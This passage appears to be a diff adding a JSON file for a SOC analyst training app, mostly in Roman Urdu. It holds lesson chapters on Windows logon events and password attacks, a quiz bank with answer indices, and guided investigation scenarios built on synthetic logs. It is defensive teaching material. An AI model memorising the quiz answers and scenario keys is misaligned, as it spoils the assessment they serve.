+    "practical": "Agla case shuru karne se pehle socho: agar aap ki shift shuru hoti hai aur queue mein 5 alerts hain, aap sab se pehle konsa kholenge aur kyun?"
+   },
+   {
+    "id": "c2",
+    "title": "Chapter 2 - Alerts kya hotay hain?",
+    "body": "Alert ka matlab ek aisi notification hai jo security system (SIEM, EDR, firewall) generate karta hai jab koi unusual ya potentially suspicious activity detect hoti hai. Har alert ek 'suggestion' hai, hukum nahi - is liye analyst ko verify karna zaroori hai.",
+    "example": "Ek SIEM rule 'Multiple failed logons (>5) single source' fire hoti hai jab ek hi source se paanch se zyada failed login attempts ek chhoti si window mein aa jayein.",
+    "lookFor": "Alert ke andar rule name, severity, host, account aur count field dekhein - yeh sab milkar batatay hain ke alert ka scope kya hai.",
+    "mistake": "Har alert ko attack samajh lena. Har alert attack nahi hota - SOC analyst ka kaam evidence verify karna hai, sirf alert dekh kar reaction dena nahi.",
+    "practical": "Socho: ek alert 'severity=HIGH' hai lekin host ek disconnected test VM hai. Kya yeh phir bhi HIGH priority hai?"
+   },
+   {
+    "id": "c3",
+    "title": "Chapter 3 - Authentication aur Login Monitoring",
+    "body": "Authentication wo process hai jis mein user apni identity prove karta hai (username + password, ya token). Har login attempt - chahe successful ho ya failed - ek log event banata hai. In events ko monitor karna SOC ka bunyadi kaam hai.",
+    "example": "Windows par 'Failed Login' ka matlab hai EventID 4625, aur 'Successful Login' ka matlab hai EventID 4624. Linux par 'Failed password' aur 'Accepted password' lines auth.log mein milti hain.",
+    "lookFor": "Dekhna yeh hai: kitni baar login fail hua, konsa account target hua, aur us ke baad koi success hui ya nahi.",
+    "mistake": "Sirf failed logins ginna aur yeh bhool jana ke us ke baad kya hua - agar success ho gayi to yeh sirf 'attempt' nahi balki 'compromise' ban jata hai.",
+    "practical": "Agar ek account par 12 failed attempts ke baad ek success ho, is se aap kya nateeja nikalenge?"
+   },
+   {
+    "id": "c4",
+    "title": "Chapter 4 - Brute Force, Password Spraying aur Credential Stuffing",
+    "body": "In teenon attacks ka concept alag hai lekin log mein pehli nazar mein ek jaisay lagtay hain. BRUTE FORCE: ek account, bohat se passwords try kiye jatay hain. PASSWORD SPRAYING: bohat se accounts, ek common password try kiya jata hai (taake lockout se bacha ja sake). CREDENTIAL STUFFING: kahin aur se churaye gaye username/password pairs ko replay kiya jata hai.",
+    "example": "Agar log mein sirf 'svc_backup' account par 12 alag attempts hain, ek hi source se - yeh brute force hai. Agar 40 alag accounts par sirf ek hi password try ho raha hai - yeh spraying hai.",
+    "lookFor": "Accounts-to-attempts ka ratio dekhein: ek account + kai attempts = brute force. Kai accounts + ek jaisa pattern = spraying.",
+    "mistake": "Teeno attacks ko 'brute force' keh dena bina ratio dekhe - yeh galat classification decision aur wrong severity de sakta hai.",
+    "practical": "Agar ek hi IP se 5 different accounts par sirf ek attempt each ho, kya yeh brute force hai ya spraying?"
+   },
+   {
+    "id": "c5",
+    "title": "Chapter 5 - Authentication Logs Padhna (Windows aur Linux)",
+    "body": "Windows Security log mein important Event IDs: 4624 (successful logon), 4625 (failed logon), 4634 (logoff), 4740 (account lockout), 4672 (special privileges assigned). Logon Type field bhi zaroori hai: Type 2 = interactive (keyboard par), Type 3 = network, Type 10 = RDP.",
+    "example": "'EventID=4625 SourceIP=203.0.113.55 SubStatus=0xC000006A' ka matlab hai galat password ke sath login fail hua us IP se.",
+    "lookFor": "SubStatus code dekhein - 0xC000006A = bad password, 0xC0000064 = username hi exist nahi karta (yeh username enumeration ka sign hai).",
+    "mistake": "SubStatus code ko ignore kar dena - yeh bata sakta hai ke attacker sirf guess kar raha hai ya usay pehle se sahi username maloom hai.",
+    "practical": "Agar SubStatus 0xC0000064 baar baar different usernames ke sath aaye, aap is se kya samjhenge?"
+   },
+   {
+    "id": "c6",
+    "title": "Chapter 6 - Source IP aur Target Account",
+    "body": "Source IP wo address hai jahan se login attempt aaya. Target account wo hai jis par attempt hua. In dono ko cross-reference karna zaroori hai: kya source IP normal hai us account ke liye? Kya account ka normal working hours match karta hai attempt ke time se?",
+    "example": "Agar 'svc_backup' account normally sirf internal backup server (10.20.8.10) se login karta hai, lekin ab external IP (203.0.113.55) se attempt ho raha hai - yeh ek bara red flag hai.",
+    "lookFor": "Account context data mein normal_sources aur normal_hours fields dekhein, phir unko current evidence ke sath compare karein.",
+    "mistake": "Sirf IP ko 'external hai isliye bad hai' keh dena bina yeh check kiye ke account ka legitimate use case kya hai.",
+    "practical": "Ek user apni normal working hours ke bahar (raat 2 baje) login karta hai - kya yeh apne aap suspicious hai, ya context chahiye?"
+   },
+   {
+    "id": "c7",
+    "title": "Chapter 7 - Asset Criticality",
+    "body": "Har host ka business mein kitna 'weight' hai, yeh Asset Criticality kehlata hai. Ek Domain Controller (DC), jahan sari organization ki identities store hoti hain, ek lab test VM se kahin zyada critical hai - chahe dono par ek jaisi alert fire ho.",
+    "example": "Asset Inventory mein 'DC-01 tier=0 criticality=CRITICAL' likha ho to iska matlab hai ke is host par koi bhi suspicious activity turant Tier-2 ko escalate honi chahiye.",
+    "lookFor": "Asset inventory se role, tier aur criticality field check karein - yeh severity decision ko directly affect karta hai.",
+    "mistake": "Har host ko ek jaisa treat karna. Tier-0 aur Tier-3 (jaise sandbox lab VM) par same alert ka response same nahi hona chahiye.",
+    "practical": "Agar ek hi tarah ka alert DC-01 aur ek lab VM par aaye, dono ki severity same honi chahiye ya alag?"
+   },
+   {
+    "id": "c8",
+    "title": "Chapter 8 - Timeline Analysis",
+    "body": "Timeline banane ka matlab hai evidence ko waqt (time) ke hisab se order mein lagana taake poori kahani samajh aa sake - shuru se le kar akhri suspicious event tak.",
+    "example": "02:14:02 pehli failed attempt, 02:15:39 success, 02:16:10 privileges assigned, 02:18:44 file share access - yeh timeline batati hai ke attack sirf login tak mehdood nahi, balki us ke baad bhi activity hui.",
+    "lookFor": "Sirf 'jab attack shuru hua' nahi balki 'attack kab tak jari raha' bhi dekhein - success ke baad ki activity aksar sab se zyada important hoti hai.",
+    "mistake": "Timeline ko successful login par rok dena, jabke asal kahani usse aagay chalti hai.",
+    "practical": "Agar login success ke 30 second baad file share access ho, kya yeh coincidence hai ya connected activity?"
+   },
+   {
+    "id": "c9",
+    "title": "Chapter 9 - False Positive vs True Positive",
+    "body": "TRUE POSITIVE: alert asal mein malicious ya unauthorized activity ko represent karta hai. FALSE POSITIVE: alert fire hui lekin activity legitimate thi (jaise scheduled scan, ya user ka apna password bhool jana).",
+    "example": "Agar failed logins ek approved vulnerability scan (change calendar mein documented) se match karte hain, to yeh False Positive hai. Agar external, undocumented IP se attempts aa rahe hain jin ke baad success ho, yeh True Positive hai.",
+    "lookFor": "Change calendar aur SOP hamesha check karein - kai 'suspicious' events asal mein authorized activity hoti hain.",
+    "mistake": "Har suspicious-looking pattern ko turant True Positive keh dena bina authorization records check kiye.",
+    "practical": "Ek vulnerability scanner IP se 200+ 'failed login' type alerts aayein - kya yeh automatically True Positive hai?"
+   },
+   {
+    "id": "c10",
+    "title": "Chapter 10 - Change Calendar aur Authorized Activity",
+    "body": "Change Calendar wo record hai jahan organization apne planned changes, scans, aur maintenance windows likhti hai. Yeh SOC analyst ka sabse pehla reference point hona chahiye jab koi activity 'unusual' lage.",
+    "example": "'CHG-4471: Authorised credentialed vulnerability scan of DMZ from 10.10.9.15, approved by AppOps' - agar evidence isi IP aur time window se match kare, to activity authorized hai.",
+    "lookFor": "Time window, source IP/system, aur approval ka match dekhein - teeno match hone chahiye, sirf ek nahi.",
+    "mistake": "Sirf yeh dekh kar ke 'kuch scan jaisa activity hai' foran False Positive keh dena bina change record se confirm kiye.",
+    "practical": "Agar activity ka time change window se bahar ho lekin source IP wahi ho jo authorized scanner ka hai, kya yeh phir bhi authorized hai?"
+   },
+   {
+    "id": "c11",
+    "title": "Chapter 11 - Escalation aur Analyst Notes",
+    "body": "Escalation ka matlab hai case ko Tier-2 ya senior analyst tak bhejna jab woh Tier-1 ke scope se bahar ho (jaise Tier-0 asset compromise). Achay Analyst Notes mein likha hona chahiye: kya hua, kab hua, konsa user/host/IP involved tha, evidence kya hai, activity authorized thi ya nahi, impact/risk kya hai, aur kya action liya gaya.",
+    "example": "Ek achi note: 'svc_backup account par 12 failed attempts 203.0.113.55 se, phir success 02:15:39 par. FW-LEGACY-11 rule ne yeh allow kiya. Tier-2 ko escalate kiya gaya SOP-12 ke tehat.'",
+    "lookFor": "Notes mein specific evidence cite karein (timestamps, IDs) - sirf 'suspicious activity dekhi' likhna kaafi nahi.",
+    "mistake": "Vague notes likhna jaise 'kuch ajeeb hua, escalate kar diya' - is se agle analyst ko kuch pata nahi chalta.",
+    "practical": "Apni notes mein kam az kam yeh 5 cheezain zaroor shamil karo: what, when, who/where, evidence, action."
+   },
+   {
+    "id": "c12",
+    "title": "Chapter 12 - Complete Investigation Workflow",
+    "body": "Har investigation isi tarteeb se chalti hai: ALERT -> VALIDATE -> IDENTIFY ASSET -> CHECK EVIDENCE -> CORRELATE EVENTS -> CHECK CHANGE/MAINTENANCE -> TRUE POSITIVE/FALSE POSITIVE -> ASSESS RISK -> CONTAINMENT/ESCALATION -> DOCUMENT. Yeh workflow yaad rakho - har case, chahe koi bhi topic ho, isi structure mein follow hoga.",
+    "example": "'Multiple Failed Logins' case mein: Alert padha -> Windows Security log se validate kiya -> DC-01 ko asset inventory mein check kiya (Tier-0) -> 4625/4624 events dekhe -> source IP aur account correlate kiya -> change calendar check kiya (kuch match nahi) -> True Positive decide kiya -> CRITICAL severity di -> Tier-2 escalate kiya -> notes likhi.",
+    "lookFor": "Har step ko order mein follow karo - koi step skip mat karo, warna galat decision ban sakta hai.",
+    "mistake": "Seedha evidence dekh kar decision de dena, beech ke steps (jaise change calendar check) skip kar dena.",
+    "practical": "Ab tum ready ho Knowledge Test dene ke liye. Test mein 10 sawalat aayenge - pass hone ke liye 10/10 chahiye."
+   }
+  ],
+  "quizBank": [
+   {
+    "id": "mq1",
+    "q": "Windows Event ID 4625 kis cheez ko represent karta hai?",
+    "options": [
+     "Successful logon",
+     "Failed logon",
+     "Account lockout",
+     "Process creation"
+    ],
+    "correct": 1,
+    "explain": "4625 hamesha ek FAILED logon attempt ko record karta hai. Successful logon ke liye EventID 4624 hota hai."
+   },
+   {
+    "id": "mq2",
+    "q": "Windows Event ID 4624 kis cheez ko represent karta hai?",
+    "options": [
+     "Failed logon",
+     "Successful logon",
+     "Account created",
+     "Group membership change"
+    ],
+    "correct": 1,
+    "explain": "4624 ek SUCCESSFUL logon ko record karta hai - yeh sab se important event hota hai jab pehle failures ke baad aata hai."
+   },
+   {
+    "id": "mq3",
+    "q": "Ek hi account par bohat se different passwords try karne ko kya kehte hain?",
+    "options": [
+     "Password spraying",
+     "Credential stuffing",
+     "Brute force",
+     "Kerberoasting"
+    ],
+    "correct": 2,
+    "explain": "Brute force mein attacker ek target account ko bohat se passwords se guess karne ki koshish karta hai."
+   },
+   {
+    "id": "mq4",
+    "q": "Ek hi common password ko bohat se different accounts par try karne ko kya kehte hain (lockout se bachne ke liye)?",
+    "options": [
+     "Brute force",
+     "Password spraying",
+     "DNS tunnelling",
+     "Lateral movement"
+    ],
+    "correct": 1,
+    "explain": "Password spraying mein attacker jaan bujh kar sirf 1-2 password try karta hai har account par, taake lockout threshold cross na ho."
+   },
+   {
+    "id": "mq5",
+    "q": "SubStatus 0xC000006A ka matlab kya hai?",
+    "options": [
+     "Username exist nahi karta",
+     "Galat password",
+     "Account locked",
+     "Account expired"
+    ],
+    "correct": 1,
+    "explain": "0xC000006A ka matlab hai username sahi hai lekin password ghalat diya gaya - yeh password guessing ka sign hai."
+   },
+   {
+    "id": "mq6",
+    "q": "SubStatus 0xC0000064 ka matlab kya hai?",
+    "options": [
+     "Galat password",
+     "Username hi exist nahi karta",
+     "Account disabled",
+     "Time restriction violation"
+    ],
+    "correct": 1,
+    "explain": "0xC0000064 batata hai ke diya gaya username hi system mein exist nahi karta - baar baar aana username enumeration ka sign hai."
+   },
+   {
+    "id": "mq7",
+    "q": "Logon Type 3 ka matlab kya hai?",
+    "options": [
+     "Interactive (keyboard par)",
+     "Network logon",
+     "RDP session",
+     "Batch job"
+    ],
+    "correct": 1,
+    "explain": "Type 3 ek network logon hoti hai (jaise SMB share access) - keyboard par direct login nahi."
+   },
+   {
+    "id": "mq8",
+    "q": "Agar ek service account normally sirf internal backup server se login karta hai, lekin ab ek external IP se login attempt aa raha hai, yeh kya indicate karta hai?",
+    "options": [
+     "Normal behaviour",
+     "Suspicious - account context se mismatch",
+     "Scheduled maintenance",
+     "False positive by default"
+    ],
+    "correct": 1,
+    "explain": "Account context (normal_sources) se mismatch hamesha investigate karna chahiye - yeh compromise ka strong indicator hai."
+   },
+   {
+    "id": "mq9",
+    "q": "SOC mein 'Change Calendar' check karne ka maqsad kya hai?",
+    "options": [
+     "Passwords reset karna",
+     "Authorized activity ko unauthorized se separate karna",
+     "Naye users add karna",
+     "Log files delete karna"
+    ],
+    "correct": 1,
+    "explain": "Change calendar SOC ko batata hai ke koi activity pehle se approved/planned thi ya nahi - is se False Positive jaldi identify hota hai."
+   },
+   {
+    "id": "mq10",
+    "q": "Agar failed login attempts bilkul us waqt match karte hain jab ek approved vulnerability scan chal raha tha, decision kya hoga?",
+    "options": [
+     "True Positive",
+     "False Positive",
+     "Needs Escalation",
+     "Cannot determine"
+    ],
+    "correct": 1,
+    "explain": "Jab evidence documented, approved change ke sath match kare, to yeh False Positive hai - real threat nahi."
+   },
+   {
+    "id": "mq11",
+    "q": "Asset criticality kis field se pata chalti hai?",
+    "options": [
+     "Alert severity label se",
+     "Asset Inventory record se (tier/criticality)",
+     "Source IP se",
+     "Event timestamp se"
+    ],
+    "correct": 1,
+    "explain": "Asset inventory record (tier, criticality, owner) yeh batata hai ke host business ke liye kitna important hai - yeh severity decision ko directly influence karta hai."
+   },
+   {
+    "id": "mq12",
+    "q": "Ek Domain Controller (DC) ka asset tier aam tor par kya hota hai?",
+    "options": [
+     "Tier 3 - low priority",
+     "Tier 0 - critical",
+     "Tier 1 - medium",
+     "Koi tier nahi hota"
+    ],
+    "correct": 1,
+    "explain": "Domain Controllers Tier-0 assets hain kyun ke wahan poori organization ki identities store hoti hain - inka compromise sab se zyada khatarnak hota hai."
+   },
+   {
+    "id": "mq13",
+    "q": "Attack timeline banate waqt sab se badi ghalti kya hoti hai?",
+    "options": [
+     "Timestamps note karna",
+     "Successful login ke baad ki activity ko ignore karna",
+     "Evidence ko order mein lagana",
+     "Source IP note karna"
+    ],
+    "correct": 1,
+    "explain": "Bohat se analysts timeline ko success tak seedh dete hain, jabke asal kahani (jaise privilege escalation, file access) usse aagay hoti hai."
+   },
+   {
+    "id": "mq14",
+    "q": "'Needs Escalation' decision kab select karni chahiye?",
+    "options": [
+     "Jab evidence bilkul clear False Positive ho",
+     "Jab case Tier-1 ke scope se bahar ho ya Tier-0 asset involve ho",
+     "Jab investigation abhi shuru hui ho",
+     "Kabhi nahi, hamesha khud close karna chahiye"
+    ],
+    "correct": 1,
+    "explain": "Agar case mein Tier-0 asset involve ho ya scope Tier-1 se bara ho, SOP ke mutabiq Tier-2 ko escalate karna chahiye."
+   },
+   {
+    "id": "mq15",
+    "q": "Ek achi Analyst Note mein kaunsi cheez zaroor honi chahiye?",
+    "options": [
+     "Sirf 'suspicious activity dekhi' likhna",
+     "Specific evidence, timestamps aur action liya gaya",
+     "Sirf apna naam likhna",
+     "Kuch bhi nahi, sirf decision kaafi hai"
+    ],
+    "correct": 1,
+    "explain": "Achi notes specific hoti hain: what happened, when, evidence (timestamps/IDs), aur kya action liya gaya - taake agla analyst turant samajh sake."
+   },
+   {
+    "id": "mq16",
+    "q": "EventID 4740 kis cheez ko represent karta hai?",
+    "options": [
+     "Account lockout",
+     "Successful logon",
+     "Process creation",
+     "DNS query"
+    ],
+    "correct": 0,
+    "explain": "4740 batata hai ke ek account lockout threshold reach hone ki waja se lock ho gaya - yeh un attempts ka proxy ho sakta hai jo aap ne khud nahi dekhe."
+   },
+   {
+    "id": "mq17",
+    "q": "Credential stuffing kis cheez par based hota hai?",
+    "options": [
+     "Random passwords guess karna",
+     "Pehle se churaye gaye username/password pairs replay karna",
+     "Sirf ek hi common password try karna",
+     "Network scanning"
+    ],
+    "correct": 1,
+    "explain": "Credential stuffing mein attacker kisi aur breach se churaye gaye asal username/password combinations ko yahan try karta hai."
+   },
+   {
+    "id": "mq18",
+    "q": "EventID 4672 kis waqt generate hota hai?",
+    "options": [
+     "Jab account ko special privileges assign hon",
+     "Jab account logoff kare",
+     "Jab password change ho",
+     "Jab DNS query ho"
+    ],
+    "correct": 0,
+    "explain": "4672 tab record hota hai jab kisi account ko special/administrative privileges assign ki jayein - yeh privilege escalation ka indicator ho sakta hai."
+   },
+   {
+    "id": "mq19",
+    "q": "Agar attack window ke baad attacker ADMIN$ share access karta hai, is se kya pata chalta hai?",
+    "options": [
+     "Attack sirf login tak mehdood tha",
+     "Attacker ne login ke baad bhi activity ki - severity barh sakti hai",
+     "Yeh unrelated normal activity hai",
+     "Iska koi matlab nahi"
+    ],
+    "correct": 1,
+    "explain": "Login ke baad share access ya privilege use, batata hai ke attacker ne successful access ko actively istemal kiya - is se severity aur bhi barh jati hai."
+   },
+   {
+    "id": "mq20",
+    "q": "Tier-1 SOC Analyst ka bunyadi kaam kya hai?",
+    "options": [
+     "Har alert ko turant block kar dena",
+     "Evidence verify karke sahi decision (TP/FP/Escalation) lena",
+     "Sirf logs delete karna",
+     "Passwords khud reset karna bina kisi verification ke"
+    ],
+    "correct": 1,
+    "explain": "Tier-1 analyst ka kaam evidence ko dhyan se verify karna aur sahi classification (True Positive / False Positive / Needs Escalation) dena hai - panic ya guess nahi."
+   }
+  ],
+  "guided": {
+   "title": "Guided Investigation - Multiple Failed Logins (Training Scenario)",
+   "brief": "Yeh ek ALAG (different) simulated scenario hai us case se jo aap Real Investigation mein karenge. Yahan account r.malik par WKS-3502 workstation ke against external IP se failed login attempts ki ek series aayi hai. Har step mein interact karo - system sirf tumhare interaction ke baad reasoning explain karega.",
+   "case": {
+    "id": "TRN-2026-0091",
+    "host": "WKS-3502",
+    "account": "r.malik",
+    "time": "2026-03-05 03:41 UTC",
+    "alert": "Multiple failed logons (>6) single source, no subsequent success"
+   },
+   "evidence": [
+    {
+     "name": "Windows Security - WKS-3502",
+     "rows": [
+      "2026-03-05 03:41:04 WKS-3502 EventID=4625 Account=r.malik LogonType=3 SourceIP=198.51.100.23 SubStatus=0xC000006A",
+      "2026-03-05 03:41:11 WKS-3502 EventID=4625 Account=r.malik LogonType=3 SourceIP=198.51.100.23 SubStatus=0xC000006A",
+      "2026-03-05 03:41:19 WKS-3502 EventID=4625 Account=r.malik LogonType=3 SourceIP=198.51.100.23 SubStatus=0xC000006A",
+      "2026-03-05 03:41:27 WKS-3502 EventID=4625 Account=r.malik LogonType=3 SourceIP=198.51.100.23 SubStatus=0xC000006A",
+      "2026-03-05 03:41:35 WKS-3502 EventID=4625 Account=r.malik LogonType=3 SourceIP=198.51.100.23 SubStatus=0xC000006A",
+      "2026-03-05 03:41:43 WKS-3502 EventID=4625 Account=r.malik LogonType=3 SourceIP=198.51.100.23 SubStatus=0xC000006A",
+      "2026-03-05 03:41:51 WKS-3502 EventID=4625 Account=r.malik LogonType=3 SourceIP=198.51.100.23 SubStatus=0xC000006A",
+      "2026-03-05 09:03:12 WKS-3502 EventID=4624 Account=r.malik LogonType=2 SourceIP=- Status=Success"
+     ]
+    },
+    {
+     "name": "Account Context",
+     "rows": [
+      "account=r.malik type=user dept=Sales normal_hours=09:00-17:00 normal_sources=WKS-3502-console (interactive only, no remote logon configured)"
+     ]
+    },
+    {
+     "name": "Threat Intel Enrichment",
+     "rows": [
+      "198.51.100.23 -> known scanning/credential-stuffing infrastructure (flagged by 2 external feeds in last 30 days), geo=unknown/VPN exit, first seen in estate 2026-03-05 03:41"
+     ]
+    },
+    {
+     "name": "Change Calendar / SOP Extract",
+     "rows": [
+      "No scheduled scans, penetration tests or maintenance windows recorded for WKS-3502 on 2026-03-05.",
+      "SOP-12 Any detection on a Tier-0 asset must be escalated to Tier 2 within 15 minutes of triage.",
+      "SOP-21 Repeated external failed logons against a workstation account with no legitimate remote-logon use case are treated as attempted compromise, even without a successful logon."
+     ]
+    }
+   ],
+   "steps": [
+    {
+     "id": "g1",
+     "title": "Step 1 - Alert Padho",
+     "type": "reveal",
+     "ask": "Neeche diya gaya alert ghoor kar parho: 'Multiple failed logons (>6) single source, no subsequent success' - WKS-3502 par.",
+     "why": "Har investigation ka pehla kaam hai alert ko samajhna - yeh kya keh raha hai, konsa host, konsa pattern.",
+     "buttonLabel": "Show Me - Alert Breakdown",
+     "reveal": "Yeh alert bata raha hai: (1) ek hi source se (2) 6 se zyada failed attempts (3) is ke baad koi success record nahi hua - abhi tak. Ab hamein raw evidence mein jaa kar isay validate karna hai."
+    },
+    {
+     "id": "g2",
+     "title": "Step 2 - Evidence Validate Karo",
+     "type": "search",
+     "evidenceSet": 0,
+     "ask": "Windows Security evidence mein search karo 'EventID=4625' taake failed attempts khud dekh sako.",
+     "why": "Alert ko sirf maan lena kaafi nahi - hamesha raw log mein evidence dhoondo aur count khud verify karo.",
+     "expect": [
+      "4625",
+      "failed"
+     ],
+     "hintText": "Search box mein '4625' type karo.",
+     "reveal": "7 alag 4625 events milay, sab r.malik account ke against, sab 198.51.100.23 se, 03:41:04 se 03:41:51 tak (sirf 47 second mein). Yeh bohat tez rate hai - automated tool ka sign."
+    },
+    {
+     "id": "g3",
+     "title": "Step 3 - Asset aur Account Identify Karo",
+     "type": "search",
+     "evidenceSet": 1,
+     "ask": "Account Context evidence set kholo aur dekho r.malik ka normal login pattern kya hai.",
+     "why": "Jab tak hamein maloom na ho ke account normally kaisay use hota hai, hum yeh nahi keh sakte ke current activity normal hai ya nahi.",
+     "expect": [
+      "r.malik",
+      "normal"
+     ],
+     "hintText": "Account Context set mein r.malik ki row parho.",
+     "reveal": "r.malik ek Sales department ka normal user hai jo sirf WKS-3502 ke console (interactive) se login karta hai - is account ke liye koi legitimate remote/network logon use case configured nahi hai. Is liye SourceIP=198.51.100.23 se Type 3 (network) attempt already suspicious hai."
+    },
+    {
+     "id": "g4",
+     "title": "Step 4 - Source IP Check Karo",
+     "type": "search",
+     "evidenceSet": 2,
+     "ask": "Threat Intel Enrichment set mein 198.51.100.23 ko search karo.",
+     "why": "External source IP ka reputation check karna batata hai ke yeh kisi known-bad infrastructure se hai ya kisi normal office/vendor se.",
+     "expect": [
+      "198.51.100.23",
+      "threat",
+      "scanning"
+     ],
+     "hintText": "IP address ko search box mein paste karo.",
+     "reveal": "198.51.100.23 do alag threat-intel feeds mein known scanning/credential-stuffing infrastructure ke tor par flagged hai. Yeh koi normal vendor ya office IP nahi hai."
+    },
+    {
+     "id": "g5",
+     "title": "Step 5 - Timeline Correlate Karo",
+     "type": "reveal",
+     "ask": "Ab dobara Windows Security evidence dekho - 03:41 ke attempts aur 09:03 ka successful login (4624) ke darmiyan gap par ghour karo.",
+     "why": "Timeline hamein batati hai ke events aapas mein connected hain ya nahi. Bara time-gap aur alag Logon Type is baat ka sign ho sakta hai ke yeh do alag ghatnayein hain.",
+     "buttonLabel": "Show Me - Timeline Analysis",
+     "reveal": "09:03:12 ki success ek Logon Type=2 (interactive, keyboard par) hai, SourceIP khali hai - yeh r.malik khud apne desk par login kar raha hai, office hours ke start mein. Yeh 03:41 ke Type 3 external attempts se BILKUL ALAG event hai, connected nahi."
+    },
+    {
+     "id": "g6",
+     "title": "Step 6 - Change Calendar Check Karo",
+     "type": "search",
+     "evidenceSet": 3,
+     "ask": "Change Calendar / SOP evidence set kholo aur dekho kya WKS-3502 ke liye koi authorized scan ya test scheduled tha.",
+     "why": "Kabhi bhi 'suspicious' lagne wali activity ko True Positive kehne se pehle change calendar zaroor check karo - authorized activity accha False Positive candidate hoti hai.",
+     "expect": [
+      "change",
+      "calendar",
+      "sop",
+      "scheduled"
+     ],
+     "hintText": "Change Calendar set ki pehli row parho.",
+     "reveal": "Change calendar mein WKS-3502 ke liye 2026-03-05 ko koi scan, test ya maintenance record nahi hai. SOP-21 saaf kehta hai: is tarah ka pattern attempted compromise mana jata hai, chahe success na bhi hui ho."
+    },
+    {
+     "id": "g7",
+     "title": "Step 7 - Decision: True Positive, False Positive ya Authorized?",
+     "type": "choice",
+     "ask": "Ab decide karo: yeh activity True Positive hai, False Positive hai, ya Authorized Activity?",
+     "options": [
+      "False Positive - normal user mistake",
+      "True Positive - attempted compromise (koi success nahi lekin still real threat)",
+      "Authorized Activity - scheduled scan"
+     ],
+     "correctIndex": 1,
+     "explain": "Sahi jawab True Positive hai. Wajah: (1) external, threat-intel-flagged IP, (2) account ka koi legitimate remote-logon use case nahi, (3) koi change calendar entry nahi, (4) SOP-21 explicitly kehta hai success na hona bhi threat ko invalid nahi karta. r.malik ka apna 09:03 login ek totally separate, normal event hai."
+    },
+    {
+     "id": "g8",
+     "title": "Step 8 - Escalation Decide Karo",
+     "type": "choice",
+     "ask": "Kya yeh case Tier-2 ko escalate hona chahiye, ya Tier-1 khud close kar sakta hai?",
+     "options": [
+      "Tier-1 khud close kar de, koi escalation nahi chahiye",
+      "Block IP aur monitor karo, escalation sirf Tier-0 asset ke liye chahiye - yahan workstation hai to Tier-1 close kar sakta hai",
+      "IP ko block karo aur SOP ke mutabiq document karo, koi mazeed escalation abhi zaroori nahi lekin agar dobara attempt ho to turant escalate karo"
+     ],
+     "correctIndex": 2,
+     "explain": "WKS-3502 Tier-0 asset nahi hai (yeh SOP-12 ka scope nahi), is liye mandatory Tier-2 escalation zaroori nahi - lekin best practice yeh hai ke IP ko block/monitor karo, case ko True Positive ke tor par document karo, aur agar yehi source dobara try kare to escalate karo. Yeh farq samajhna zaroori hai: har True Positive automatically Tier-2 escalation nahi banta - yeh asset criticality par depend karta hai."
+    },
+    {
+     "id": "g9",
+     "title": "Step 9 - Analyst Notes Likho",
+     "type": "reveal",
+     "ask": "Ab socho tum apni Analyst Notes kaise likhoge is case ke liye.",
+     "why": "Achi notes agle analyst (ya khud tumhe baad mein) poori kahani samjha deti hain bina dobara sari evidence khangalay.",
+     "buttonLabel": "Show Me - Example Note",
+     "reveal": "Misal: 'r.malik (WKS-3502) par 7x failed logon (4625) 198.51.100.23 se, 03:41:04-03:41:51, Logon Type 3, SubStatus 0xC000006A. IP threat-intel par scanning/cred-stuffing infrastructure ke tor par flagged. Account ka koi remote-logon use case nahi (Account Context). Change calendar mein koi matching authorized activity nahi (SOP-21 applies). Baad ka 09:03:12 login (Type 2, interactive) unrelated normal user activity hai. Decision: True Positive - attempted compromise, koi success nahi. Action: IP block/monitor recommend kiya, escalation abhi zaroori nahi (non-Tier-0 asset), dobara attempt hone par escalate karna hai.' Ab tum Real Investigation mode ke liye ready ho - wahan ek bilkul alag scenario hai aur is baar koi answers reveal nahi hongay."
+    }
+   ]
+  }
+ },
+ {
+  "id": 5,
+  "title": "Windows Event Investigation",
+  "domain": "Windows",
+  "tier": "Tier 1",
+  "theory": {
+   "concept": "Directory object changes are logged as their own event family. 4720 creates a user, 4722 enables it, 4724 resets a password, 4728/4732 add a member to a global/local security group, 4738 modifies an account, 4726 deletes one. An attacker who has domain write access will usually create or promote an account, because that survives the password reset you are about to perform on the account they stole.",
+   "why": "Containment fails when you reset the compromised account and miss the backdoor account. Checking for account creation and group changes during the attack window is mandatory after any credential compromise.",
+   "look": [
+    "4720 followed within seconds by 4722 and 4732 from the same subject account",
+    "New accounts whose names imitate service accounts: svc_, adm_, help-desk, or a trailing character variation on a real account",
+    "Membership additions to Domain Admins, Enterprise Admins, Backup Operators or local Administrators",
+    "The Subject account on the event - that tells you which compromised identity performed the change",
+    "Account creation outside change-management hours"
+   ],
+   "fp": [
+    "IT genuinely creates accounts - always check the ticket/change reference and whether the subject is an identity-management service account",
+    "Group membership changes during onboarding batches"
+   ],
+   "tips": [
+    "The Subject/Caller field answers 'who did this'. The Target field answers 'to whom'.",
+    "A new account with a password that never expires and no manager attribute is a strong backdoor indicator."
+   ]
+  },
+  "case": {
+   "id": "SOC-2026-00493",
+   "severity": "HIGH",
+   "alert": "Privileged group membership change on DC-01 during active incident window",
+   "host": "DC-01",
+   "time": "2026-03-04 02:22 UTC",
+   "source": "Windows Security / AD Audit",
+   "brief": "Following the svc_backup compromise, audit the directory change events on DC-01. Determine whether the attacker established a persistent identity and which account performed the changes."
+  },
+  "mitre": "T1136.002 - Create Account: Domain Account",
+  "evidence": [
+   {
+    "name": "AD Audit Events - DC-01",
+    "rows": [
+     "2026-03-04 02:22:07 DC-01 EventID=4720 TargetAccount=svc_backup2 SubjectAccount=svc_backup SubjectIP=203.0.113.55",
+     "2026-03-04 02:22:08 DC-01 EventID=4724 TargetAccount=svc_backup2 SubjectAccount=svc_backup",
+     "2026-03-04 02:22:09 DC-01 EventID=4722 TargetAccount=svc_backup2 SubjectAccount=svc_backup",
+     "2026-03-04 02:22:14 DC-01 EventID=4738 TargetAccount=svc_backup2 Changes=\"PasswordNeverExpires=True; UserAccountControl=0x10200\" SubjectAccount=svc_backup",
+     "2026-03-04 02:22:31 DC-01 EventID=4728 TargetGroup=\"Domain Admins\" TargetAccount=svc_backup2 SubjectAccount=svc_backup",
+     "2026-03-04 02:23:02 DC-01 EventID=4624 Account=svc_backup2 LogonType=3 SourceIP=203.0.113.55 Status=Success",
+     "2026-03-04 09:14:20 DC-01 EventID=4720 TargetAccount=t.iqbal SubjectAccount=svc_idm SubjectIP=10.20.8.40",
+     "2026-03-04 09:14:26 DC-01 EventID=4728 TargetGroup=\"Logistics Users\" TargetAccount=t.iqbal SubjectAccount=svc_idm",
